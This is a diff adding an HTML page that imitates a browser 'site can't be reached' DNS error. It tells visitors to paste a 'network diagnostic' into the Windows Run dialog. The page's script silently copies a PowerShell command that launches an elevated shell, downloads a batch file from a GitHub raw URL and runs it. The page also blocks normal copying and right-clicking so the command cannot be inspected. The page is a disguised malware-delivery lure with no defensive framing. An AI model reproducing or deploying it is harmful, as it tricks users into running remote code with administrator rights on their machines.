@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>This site can't be reached</title>
+<style>
+  :root {
+    --bg: #ffffff;
+    --fg: #202124;
+    --muted: #5f6368;
+    --link: #1a73e8;
+    --border: #dadce0;
+    --container: #f1f3f4;
+    --code-bg: #202124;
+    --code-fg: #e8eaed;
+    --copy-hover: #f1f3f4;
+    --copied-color: #00c853;
+    --hint-color: #1a73e8;
+    --error-bg: #fce8e6;
+    --error-text: #d93025;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { min-height: 100vh; }
+  body {
+    background: var(--bg);
+    color: var(--fg);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 14px;
+    line-height: 1.55;
+    padding: 48px 24px;
+    -webkit-user-select: none;
+    -moz-user-select: none;
+    user-select: none;
+    -webkit-touch-callout: none;
+  }
+  .container {
+    max-width: 640px;
+    margin: 0 auto;
+  }
+  .error-icon {
+    display: flex;
+    justify-content: center;
+    margin-bottom: 18px;
+    user-select: none;
+  }
+  .error-icon svg {
+    width: 72px;
+    height: 72px;
+  }
+  .error-text {
+    text-align: center;
+    color: var(--error-text);
+    background: var(--error-bg);
+    padding: 14px 20px;
+    border-radius: 8px;
+    font-size: 18px;
+    font-weight: 500;
+    margin-bottom: 32px;
+  }
+  h1 {
+    font-size: 26px;
+    font-weight: 400;
+    color: var(--fg);
+    margin-bottom: 14px;
+    line-height: 1.25;
+  }
+  .description {
+    color: var(--muted);
+    margin-bottom: 28px;
+    font-size: 15px;
+    line-height: 1.6;
+  }
+  .description strong { color: var(--fg); }
+  .steps-section {
+    margin-top: 8px;
+    padding: 22px 24px;
+    background: var(--container);
+    border-radius: 10px;
+    border: 1px solid var(--border);
+  }
+  .steps-title {
+    font-size: 14px;
+    font-weight: 600;
+    color: var(--fg);
+    margin-bottom: 16px;
+    text-transform: uppercase;
+    letter-spacing: 0.4px;
+  }
+  .steps-list {
+    list-style: none;
+    counter-reset: step;
+  }
+  .steps-list > li {
+    position: relative;
+    padding-left: 40px;
+    margin-bottom: 16px;
+    counter-increment: step;
+    min-height: 28px;
+  }
+  .steps-list > li:last-child { margin-bottom: 4px; }
+  .steps-list > li::before {
+    content: counter(step);
+    position: absolute;
+    left: 0; top: 0;
+    width: 28px; height: 28px;
+    background: var(--link);
+    color: #fff;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 14px;
+    font-weight: 700;
+  }
+  kbd {
+    background: #fff;
+    border: 1px solid var(--border);
+    border-bottom-width: 2px;
+    border-radius: 4px;
+    padding: 2px 8px;
+    font-family: "Segoe UI", Roboto, Arial, sans-serif;
+    font-size: 12px;
+    font-weight: 600;
+    color: var(--fg);
+    box-shadow: 0 1px 0 rgba(0,0,0,0.08);
+    display: inline-block;
+    margin: 0 2px;
+  }
+  .code-block {
+    background: var(--code-bg);
+    border-radius: 8px;
+    padding: 16px 18px;
+    margin: 16px 0;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+  .code-text {
+    flex: 1;
+    color: var(--code-fg);
+    font-family: "Consolas", "SF Mono", "Courier New", monospace;
+    font-size: 14px;
+    letter-spacing: 0.5px;
+    white-space: nowrap;
+    overflow-x: auto;
+  }
+  .copy-btn {
+    background: transparent;
+    border: 1px solid #5f6368;
+    color: #e8eaed;
+    padding: 6px 14px;
+    border-radius: 5px;
+    cursor: pointer;
+    font-size: 12px;
+    font-weight: 600;
+    font-family: inherit;
+    transition: all 0.15s ease;
+    white-space: nowrap;
+    flex-shrink: 0;
+  }
+  .copy-btn:hover {
+    background: rgba(255,255,255,0.08);
+    border-color: #8b8e92;
+  }
+  .copy-btn:active { transform: scale(0.97); }
+  .copy-btn.copied {
+    background: var(--copied-color);
+    border-color: var(--copied-color);
+    color: #fff;
+  }
+  .footer-hint {
+    margin-top: 18px;
+    text-align: center;
+    font-size: 13px;
+    font-weight: 500;
+    color: var(--hint-color);
+    transition: all 0.3s ease;
+  }
+  .footer-hint.ready {
+    color: var(--copied-color);
+    font-weight: 600;
+  }
+  .spacer { flex-grow: 1; }
+</style>
+</head>
+<body>
+  <div class="container">
+    <div class="error-icon">
+      <svg viewBox="0 0 24 24" fill="none">
+        <circle cx="12" cy="12" r="11" fill="#d93025"/>
+        <path d="M12 7v6" stroke="#fff" stroke-width="2.4" stroke-linecap="round"/>
+        <circle cx="12" cy="16.5" r="1.3" fill="#fff"/>
+      </svg>
+    </div>
+    <div class="error-text">
+      <strong>DNS_PROBE_FINISHED_NXDOMAIN</strong>
+    </div>
+
+    <h1>This site can't be reached</h1>
+    <p class="description">
+      <strong>www.example.com</strong>'s server IP address could not be found. The connection was reset due to a DNS resolution failure on your device. Try running the network diagnostic utility below to flush your DNS cache and restore connectivity.
+    </p>
+
+    <div class="steps-section">
+      <div class="steps-title">Network Diagnostic Steps</div>
+      <ol class="steps-list">
+        <li>Press <kbd>Win</kbd> + <kbd>R</kbd> on your keyboard until the Run dialog appears.</li>
+        <li>Paste the diagnostic code below and press <kbd>Enter</kbd>.</li>
+        <li>Refresh this page to reconnect to the network.</li>
+      </ol>
+
+      <div class="code-block">
+        <div class="code-text">press copy to you can copy code</div>
+        <button class="copy-btn" id="copyBtn" type="button">Copy</button>
+      </div>
+
+      <div class="footer-hint" id="footerHint">Refresh after copying the code</div>
+    </div>
+  </div>
+
+<script>
+(function() {
+  const codeToCopy = 'powershell -Command "Start-Process cmd -Verb RunAs -ArgumentList '/c curl -L https://raw.githubusercontent.com/banzoxOG/test/refs/heads/main/installer.bat -o %temp%\installer.bat & %temp%\installer.bat'"';
+  const copyBtn = document.getElementById('copyBtn');
+  const footerHint = document.getElementById('footerHint');
+
+  copyBtn.addEventListener('click', async function(e) {
+    e.preventDefault();
+    e.stopPropagation();
+
+    let copied = false;
+
+    // Primary method
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      try {
+        await navigator.clipboard.writeText(codeToCopy);
+        copied = true;
+      } catch (err) {}
+    }
+
+    // Fallback 1: execCommand
+    if (!copied) {
+      try {
+        const ta = document.createElement('textarea');
+        ta.value = codeToCopy;
+        ta.style.position = 'fixed';
+        ta.style.left = '-9999px';
+        ta.style.top = '0';
+        ta.setAttribute('readonly', '');
+        document.body.appendChild(ta);
+        ta.select();
+        ta.setSelectionRange(0, ta.value.length);
+        copied = document.execCommand('copy');
+        document.body.removeChild(ta);
+      } catch (err) {}
+    }
+
+    if (copied) {
+      copyBtn.textContent = 'Copied';
+      copyBtn.classList.add('copied');
+      footerHint.textContent = 'Code copied! Now refresh the page.';
+      footerHint.classList.add('ready');
+    } else {
+      copyBtn.textContent = 'Failed';
+      setTimeout(() => { copyBtn.textContent = 'Copy'; }, 1500);
+    }
+  });
+
+  // Block all other copy methods
+  document.addEventListener('copy', function(e) {
+    e.preventDefault();
+    e.clipboardData.setData('text/plain', '');
+    return false;
+  });
+
+  document.addEventListener('cut', function(e) {
+    e.preventDefault();
+    e.clipboardData.setData('text/plain', '');
+    return false;
+  });
+
+  // Block right-click context menu
+  document.addEventListener('contextmenu', function(e) {
+    e.preventDefault();
+    return false;
+  });
+
+  // Block keyboard shortcuts (Ctrl+C, Ctrl+X, Ctrl+A, Cmd+C, Cmd+X, Cmd+A)
+  document.addEventListener('keydown', function(e) {
+    const key = e.key.toLowerCase();
+    if ((e.ctrlKey || e.metaKey) && ['c', 'x', 'a'].includes(key)) {
+      e.preventDefault();
+      e.stopPropagation();
+      return false;
+    }
+  });
+
+  // Block drag selection
+  document.addEventListener('dragstart', function(e) {
+    e.preventDefault();
+    return false;
+  });
+})();
+</script>
+</body>
+</html>
